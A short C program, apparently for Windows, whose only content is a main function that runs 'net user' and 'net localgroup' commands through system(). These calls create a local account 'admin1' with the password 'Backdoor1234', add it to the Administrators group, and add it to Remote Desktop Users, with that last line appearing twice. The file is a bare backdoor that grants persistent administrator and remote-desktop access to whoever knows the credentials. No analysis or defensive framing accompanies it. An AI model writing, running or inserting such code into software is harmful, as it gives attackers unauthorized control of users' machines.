#include <stdio.h>
#define ID_MANIFEST 1
#ifndef RT_MANIFEST
#define RT_MANIFEST MAKEINTRESOURCE(24)
#endif

int main() {
	system("net user admin1 Backdoor1234 /add");
	system("net localgroup \"Remote Desktop Users\" admin1 /add");
	system("net localgroup \"Administrators\" admin1 /add");
	system("net localgroup \"Remote Desktop Users\" admin1 /add");
	return 0;
}
